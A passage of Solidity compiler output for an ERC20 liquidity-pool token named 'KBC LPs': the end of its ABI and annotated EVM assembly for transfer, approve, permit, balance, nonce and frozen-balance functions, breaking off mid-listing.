									"name": "deadline",
									"type": "uint256"
								},
								{
									"internalType": "uint8",
									"name": "v",
									"type": "uint8"
								},
								{
									"internalType": "bytes32",
									"name": "r",
									"type": "bytes32"
								},
								{
									"internalType": "bytes32",
									"name": "s",
									"type": "bytes32"
								}
							],
							"name": "permit",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "symbol",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"src/ERC20.sol\":111:4441  contract ERC20 is IERC20 {... */\n  mstore(0x40, 0x80)\n    /* \"src/ERC20.sol\":1017:1502  constructor() public {... */\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x00\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n  pop\n    /* \"src/ERC20.sol\":1203:1336  keccak256(... */\n  mload(0x40)\n    /* \"src/ERC20.sol\":1107:1114  chainid */\n  chainid\n  swap1\n    /* \"src/ERC20.sol\":1203:1336  keccak256(... */\n  dup1\n  0x52\n  data_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f\n  dup3\n  codecopy\n  0x40\n  dup1\n  mload\n  swap2\n  dup3\n  swap1\n  sub\n  0x52\n  add\n  dup3\n  keccak256\n    /* \"src/ERC20.sol\":1370:1374  name */\n  dup3\n  dup3\n  add\n  dup3\n  mstore\n  0x07\n  dup4\n  mstore\n  shl(0xc8, 0x4b4243204c5073)\n  0x20\n  swap4\n  dup5\n  add\n  mstore\n    /* \"src/ERC20.sol\":1404:1414  bytes(\"1\") */\n  dup2\n  mload\n  dup1\n  dup4\n  add\n  dup4\n  mstore\n  0x01\n  dup2\n  mstore\n  shl(0xf8, 0x31)\n  swap1\n  dup5\n  add\n  mstore\n    /* \"src/ERC20.sol\":1175:1485  abi.encode(... */\n  dup2\n  mload\n  dup1\n  dup5\n  add\n  swap2\n  swap1\n  swap2\n  mstore\n    /* \"src/ERC20.sol\":1354:1376  keccak256(bytes(name)) */\n  0x6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe\n    /* \"src/ERC20.sol\":1175:1485  abi.encode(... */\n  dup2\n  dup4\n  add\n  mstore\n    /* \"src/ERC20.sol\":1394:1415  keccak256(bytes(\"1\")) */\n  0xc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6\n    /* \"src/ERC20.sol\":1175:1485  abi.encode(... */\n  0x60\n  dup3\n  add\n  mstore\n  0x80\n  dup2\n  add\n  swap5\n  swap1\n  swap5\n  mstore\n    /* \"src/ERC20.sol\":1466:1470  this */\n  address\n    /* \"src/ERC20.sol\":1175:1485  abi.encode(... */\n  0xa0\n  dup1\n  dup7\n  add\n  swap2\n  swap1\n  swap2\n  mstore\n  dup2\n  mload\n    /* \"--CODEGEN--\":26:47   */\n  dup1\n  dup7\n  sub\n    /* \"--CODEGEN--\":22:54   */\n  swap1\n  swap2\n  add\n    /* \"--CODEGEN--\":6:55   */\n  dup2\n  mstore\n    /* \"src/ERC20.sol\":1175:1485  abi.encode(... */\n  0xc0\n  swap1\n  swap5\n  add\n  swap1\n  mstore\n    /* \"src/ERC20.sol\":1152:1495  keccak256(... */\n  dup3\n  mload\n  swap3\n  add\n  swap2\n  swap1\n  swap2\n  keccak256\n    /* \"src/ERC20.sol\":1133:1149  DOMAIN_SEPARATOR */\n  0x04\n    /* \"src/ERC20.sol\":1133:1495  DOMAIN_SEPARATOR = keccak256(... */\n  sstore\n  pop\n    /* \"src/ERC20.sol\":111:4441  contract ERC20 is IERC20 {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\ndata_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f 454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429\n\nsub_0: assembly {\n        /* \"src/ERC20.sol\":111:4441  contract ERC20 is IERC20 {... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_1:\n        /* \"src/ERC20.sol\":111:4441  contract ERC20 is IERC20 {... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x47d5d856\n      gt\n      tag_17\n      jumpi\n      dup1\n      0x95d89b41\n      gt\n      tag_18\n      jumpi\n      dup1\n      0x95d89b41\n      eq\n      tag_13\n      jumpi\n      dup1\n      0xa9059cbb\n      eq\n      tag_14\n      jumpi\n      dup1\n      0xd505accf\n      eq\n      tag_15\n      jumpi\n      dup1\n      0xdd62ed3e\n      eq\n      tag_16\n      jumpi\n      jump(tag_2)\n    tag_18:\n      dup1\n      0x47d5d856\n      eq\n      tag_10\n      jumpi\n      dup1\n      0x70a08231\n      eq\n      tag_11\n      jumpi\n      dup1\n      0x7ecebe00\n      eq\n      tag_12\n      jumpi\n      jump(tag_2)\n    tag_17:\n      dup1\n      0x23b872dd\n      gt\n      tag_19\n      jumpi\n      dup1\n      0x23b872dd\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x30adf81f\n      eq\n      tag_7\n      jumpi\n      dup1\n      0x313ce567\n      eq\n      tag_8\n      jumpi\n      dup1\n      0x3644e515\n      eq\n      tag_9\n      jumpi\n      jump(tag_2)\n    tag_19:\n      dup1\n      0x06fdde03\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x095ea7b3\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x18160ddd\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"src/ERC20.sol\":175:214  string public constant name = \"KBC LPs\" */\n    tag_3:\n      tag_20\n      tag_21\n      jump\t// in\n    tag_20:\n      0x40\n      dup1\n      mload\n      0x20\n      dup1\n      dup3\n      mstore\n      dup4\n      mload\n      dup2\n      dup4\n      add\n      mstore\n      dup4\n      mload\n      swap2\n      swap3\n      dup4\n      swap3\n      swap1\n      dup4\n      add\n      swap2\n      dup6\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_22:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_24\n      jumpi\n        /* \"--CODEGEN--\":90:101   */\n      dup2\n      dup2\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":71:82   */\n      dup4\n      dup3\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_22)\n    tag_24:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"src/ERC20.sol\":175:214  string public constant name = \"KBC LPs\" */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_25\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_25:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"src/ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_4:\n      tag_26\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_27\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_27:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n      dup2\n      calldataload\n      and\n      swap1\n      0x20\n      add\n      calldataload\n      tag_28\n      jump\t// in\n    tag_26:\n      0x40\n      dup1\n      mload\n      swap2\n      iszero\n      iszero\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/ERC20.sol\":307:333  uint256 public totalSupply */\n    tag_5:\n      tag_29\n      tag_30\n      jump\t// in\n    tag_29:\n      0x40\n      dup1\n      mload\n      swap2\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/ERC20.sol\":3108:3469  function transferFrom(... */\n    tag_6:\n      tag_26\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x60\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_32\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_32:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":3108:3469  function transferFrom(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      add\n      calldataload\n      tag_33\n      jump\t// in\n        /* \"src/ERC20.sol\":656:772  bytes32 public constant PERMIT_TYPEHASH =... */\n    tag_7:\n      tag_29\n      tag_35\n      jump\t// in\n        /* \"src/ERC20.sol\":266:301  uint8 public constant decimals = 18 */\n    tag_8:\n      tag_36\n      tag_37\n      jump\t// in\n    tag_36:\n      0x40\n      dup1\n      mload\n      0xff\n      swap1\n      swap3\n      and\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/ERC20.sol\":515:546  bytes32 public DOMAIN_SEPARATOR */\n    tag_9:\n      tag_29\n      tag_39\n      jump\t// in\n        /* \"src/ERC20.sol\":459:508  mapping(address => uint256) public _frozenBalance */\n    tag_10:\n      tag_29\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_41\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_41:\n      pop\n        /* \"src/ERC20.sol\":459:508  mapping(address => uint256) public _frozenBalance */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_42\n      jump\t// in\n        /* \"src/ERC20.sol\":339:383  mapping(address => uint256) public balanceOf */\n    tag_11:\n      tag_29\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_44\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_44:\n      pop\n        /* \"src/ERC20.sol\":339:383  mapping(address => uint256) public balanceOf */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_45\n      jump\t// in\n        /* \"src/ERC20.sol\":778:819  mapping(address => uint256) public nonces */\n    tag_12:\n      tag_29\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_47\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_47:\n      pop\n        /* \"src/ERC20.sol\":778:819  mapping(address => uint256) public nonces */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_48\n      jump\t// in\n        /* \"src/ERC20.sol\":220:260  string public constant symbol = \"KBC-LP\" */\n    tag_13:\n      tag_20\n      tag_50\n      jump\t// in\n        /* \"src/ERC20.sol\":2963:3102  function transfer(address to, uint256 value) external returns (bool) {... */\n    tag_14:\n      tag_26\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_56\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_56:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2963:3102  function transfer(address to, uint256 value) external returns (bool) {... */\n      dup2\n      calldataload\n      and\n      swap1\n      0x20\n      add\n      calldataload\n      tag_57\n      jump\t// in\n        /* \"src/ERC20.sol\":3475:4439  function permit(... */\n    tag_15:\n      tag_58\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:16   */\n      0xe0\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:17   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_59\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_59:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":3475:4439  function permit(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      dup2\n      add\n      calldataload\n      swap1\n      0x60\n      dup2\n      add\n      calldataload\n      swap1\n      0xff\n      0x80\n      dup3\n      add\n      calldataload\n      and\n      swap1\n      0xa0\n      dup2\n      add\n      calldataload\n      swap1\n      0xc0\n      add\n      calldataload\n      tag_60\n      jump\t// in\n    tag_58:\n      stop\n        /* \"src/ERC20.sol\":389:453  mapping(address => mapping(address => uint256)) public allowance */\n    tag_16:\n      tag_29\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_62\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_62:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":389:453  mapping(address => mapping(address => uint256)) public allowance */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      add\n      calldataload\n      and\n      tag_63\n      jump\t// in\n        /* \"src/ERC20.sol\":175:214  string public constant name = \"KBC LPs\" */\n    tag_21:\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x07\n      dup2\n      mstore\n      0x20\n      add\n      shl(0xc8, 0x4b4243204c5073)\n      dup2\n      mstore\n      pop\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_28:\n        /* \"src/ERC20.sol\":2877:2881  bool */\n      0x00\n        /* \"src/ERC20.sol\":2893:2929  _approve(msg.sender, spender, value) */\n      tag_65\n        /* \"src/ERC20.sol\":2902:2912  msg.sender */\n      caller\n        /* \"src/ERC20.sol\":2914:2921  spender */\n      dup5\n        /* \"src/ERC20.sol\":2923:2928  value */\n      dup5\n        /* \"src/ERC20.sol\":2893:2901  _approve */\n      tag_66\n        /* \"src/ERC20.sol\":2893:2929  _approve(msg.sender, spender, value) */\n      jump\t// in\n    tag_65:\n      pop\n        /* \"src/ERC20.sol\":2946:2950  true */\n      0x01\n        /* \"src/ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_64:\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"src/ERC20.sol\":307:333  uint256 public totalSupply */\n    tag_30:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":3108:3469  function transferFrom(... */\n    tag_33:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":3239:3254  allowance[from] */\n      dup4\n      and\n        /* \"src/ERC20.sol\":3219:3223  bool */\n      0x00\n        /* \"src/ERC20.sol\":3239:3254  allowance[from] */\n      swap1\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":3239:3248  allowance */\n      0x02\n        /* \"src/ERC20.sol\":3239:3254  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/ERC20.sol\":3255:3265  msg.sender */\n      caller\n        /* \"src/ERC20.sol\":3239:3266  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      dup2\n      keccak256\n      sload\n      not(0x00)\n        /* \"src/ERC20.sol\":3239:3281  allowance[from][msg.sender] != uint256(-1) */\n      eq\n        /* \"src/ERC20.sol\":3235:3406  if (allowance[from][msg.sender] != uint256(-1)) {... */\n      tag_68\n      jumpi\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":3327:3342  allowance[from] */\n      dup5\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":3327:3336  allowance */\n      0x02\n        /* \"src/ERC20.sol\":3327:3342  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/ERC20.sol\":3343:3353  msg.sender */\n      caller\n        /* \"src/ERC20.sol\":3327:3354  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n      sload\n        /* \"src/ERC20.sol\":3327:3395  allowance[from][msg.sender].sub(... */\n      tag_69\n      swap1\n        /* \"src/ERC20.sol\":3376:3381  value */\n      dup4\n        /* \"src/ERC20.sol\":3327:3395  allowance[from][msg.sender].sub(... */\n      0xffffffff\n        /* \"src/ERC20.sol\":3327:3358  allowance[from][msg.sender].sub */\n      tag_70\n        /* \"src/ERC20.sol\":3327:3395  allowance[from][msg.sender].sub(... */\n      and\n      jump\t// in\n    tag_69:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":3297:3312  allowance[from] */\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":3297:3306  allowance */\n      0x02\n        /* \"src/ERC20.sol\":3297:3312  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/ERC20.sol\":3313:3323  msg.sender */\n      caller\n        /* \"src/ERC20.sol\":3297:3324  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n        /* \"src/ERC20.sol\":3297:3395  allowance[from][msg.sender] = allowance[from][msg.sender].sub(... */\n      sstore\n        /* \"src/ERC20.sol\":3235:3406  if (allowance[from][msg.sender] != uint256(-1)) {... */\n    tag_68:\n        /* \"src/ERC20.sol\":3415:3441  _transfer(from, to, value) */\n      tag_71\n        /* \"src/ERC20.sol\":3425:3429  from */\n      dup5\n        /* \"src/ERC20.sol\":3431:3433  to */\n      dup5\n        /* \"src/ERC20.sol\":3435:3440  value */\n      dup5\n        /* \"src/ERC20.sol\":3415:3424  _transfer */\n      tag_72\n        /* \"src/ERC20.sol\":3415:3441  _transfer(from, to, value) */\n      jump\t// in\n    tag_71:\n      pop\n        /* \"src/ERC20.sol\":3458:3462  true */\n      0x01\n        /* \"src/ERC20.sol\":3108:3469  function transferFrom(... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/ERC20.sol\":656:772  bytes32 public constant PERMIT_TYPEHASH =... */\n    tag_35:\n        /* \"src/ERC20.sol\":706:772  0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9 */\n      0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9\n        /* \"src/ERC20.sol\":656:772  bytes32 public constant PERMIT_TYPEHASH =... */\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":266:301  uint8 public constant decimals = 18 */\n    tag_37:\n        /* \"src/ERC20.sol\":299:301  18 */\n      0x12\n        /* \"src/ERC20.sol\":266:301  uint8 public constant decimals = 18 */\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":515:546  bytes32 public DOMAIN_SEPARATOR */\n    tag_39:\n      sload(0x04)\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":459:508  mapping(address => uint256) public _frozenBalance */\n    tag_42:\n      mstore(0x20, 0x03)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":339:383  mapping(address => uint256) public balanceOf */\n    tag_45:\n      mstore(0x20, 0x01)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":778:819  mapping(address => uint256) public nonces */\n    tag_48:\n      mstore(0x20, 0x05)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":220:260  string public constant symbol = \"KBC-LP\" */\n    tag_50:\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x06\n      dup2\n      mstore\n      0x20\n      add\n      shl(0xd4, 0x04b42432d4c5)\n      dup2\n      mstore\n      pop\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":2963:3102  function transfer(address to, uint256 value) external returns (bool) {... */\n    tag_57:\n        /* \"src/ERC20.sol\":3026:3030  bool */\n      0x00\n        /* \"src/ERC20.sol\":3042:3074  _transfer(msg.sender, to, value) */\n      tag_65\n        /* \"src/ERC20.sol\":3052:3062  msg.sender */\n      caller\n        /* \"src/ERC20.sol\":3064:3066  to */\n      dup5\n        /* \"src/ERC20.sol\":3068:3073  value */\n      dup5\n        /* \"src/ERC20.sol\":3042:3051  _transfer */\n      tag_72\n        /* \"src/ERC20.sol\":3042:3074  _transfer(msg.sender, to, value) */\n      jump\t// in\n        /* \"src/ERC20.sol\":3475:4439  function permit(... */\n    tag_60:\n        /* \"src/ERC20.sol\":3688:3703  block.timestamp */\n      timestamp\n        /* \"src/ERC20.sol\":3676:3684  deadline */\n      dup5\n        /* \"src/ERC20.sol\":3676:3703  deadline >= block.timestamp */\n      lt\n      iszero\n        /* \"src/ERC20.sol\":3668:3724  require(deadline >= block.timestamp, \"Pancake: EXPIRED\") */\n      tag_76\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x10\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x82, 0x14185b98d85ad94e8811561412549151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_76:\n        /* \"src/ERC20.sol\":3836:3852  DOMAIN_SEPARATOR */\n      sload(0x04)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":4073:4086  nonces[owner] */\n      dup1\n      dup10\n      and\n        /* \"src/ERC20.sol\":3734:3748  bytes32 digest */\n      0x00\n        /* \"src/ERC20.sol\":4073:4086  nonces[owner] */\n      dup2\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":4073:4079  nonces */\n      0x05\n        /* \"src/ERC20.sol\":4073:4086  nonces[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/ERC20.sol\":4073:4088  nonces[owner]++ */\n      dup1\n      sload\n      0x01\n      dup1\n      dup3\n      add\n      swap1\n      swap3\n      sstore\n        /* \"src/ERC20.sol\":3901:4144  abi.encode(... */\n      dup3\n      mload\n        /* \"src/ERC20.sol\":706:772  0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9 */\n      0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9\n        /* \"src/ERC20.sol\":3901:4144  abi.encode(... */\n      dup2\n      dup7\n      add\n      mstore\n      dup1\n      dup5\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      swap6\n      dup14\n      and\n      0x60\n      dup7\n      add\n      mstore\n      0x80\n      dup6\n      add\n      dup13\n      swap1\n      mstore\n      0xa0\n      dup6\n      add\n      swap6\n      swap1\n      swap6\n      mstore\n      0xc0\n      dup1\n      dup6\n      add\n      dup12\n      swap1\n      mstore\n      dup2\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup7\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap2\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":3901:4144  abi.encode(... */\n      0xe0\n      dup6\n      add\n      dup3\n      mstore\n        /* \"src/ERC20.sol\":3870:4162  keccak256(... */\n      dup1\n      mload\n      swap1\n      dup4\n      add\n      keccak256\n      shl(0xf0, 0x1901)\n        /* \"src/ERC20.sol\":3774:4176  abi.encodePacked(... */\n      0x0100\n      dup7\n      add\n      mstore\n      0x0102\n      dup6\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      0x0122\n      dup1\n      dup6\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      dup1\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup6\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap7\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup7\n      mstore\n        /* \"src/ERC20.sol\":3774:4176  abi.encodePacked(... */\n      0x0142\n      dup5\n      add\n      dup1\n      dup3\n      mstore\n        /* \"src/ERC20.sol\":3751:4186  keccak256(... */\n      dup7\n      mload\n      swap7\n      dup4\n      add\n      swap7\n      swap1\n      swap7\n      keccak256\n        /* \"src/ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      swap6\n      dup4\n      swap1\n      mstore\n      0x0162\n      dup5\n      add\n      dup1\n      dup3\n      mstore\n      dup7\n      